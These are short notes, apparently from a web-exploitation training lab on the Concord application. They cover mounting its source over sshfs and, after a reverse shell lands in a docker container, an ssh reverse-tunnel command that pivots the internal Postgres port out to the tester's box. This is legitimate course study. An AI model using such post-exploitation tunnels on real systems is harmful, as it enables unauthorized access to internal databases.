We can remote mount the concord directories with:
```bash
sshfs -o allow_other,default_permissions student@concord:/home/student/concord-1.43.0 /home/vagrant/Desktop/awae/concord/part-1/1.43
```
```bash
sshfs -o allow_other,default_permissions student@concord:/home/student/concord-1.83.0 /home/vagrant/Desktop/awae/concord/part-1/1.83
```
Part 1 ExtraMile:  
Our reverse shell lands us in a docker container.  
We should promote the shell to a fully interactive tty.  
Python2.7 is installed on the container.  
In order to access the postgres port with our java client from our kali box we can do a reverse tunnel (from within the reverseshell):
```bash
ssh -N -R 5432:172.18.0.4:5432 tunnelboy@192.168.119.130 -o "StrictHostKeyChecking=no"
```
We can build our jdbc client with compile.ps1  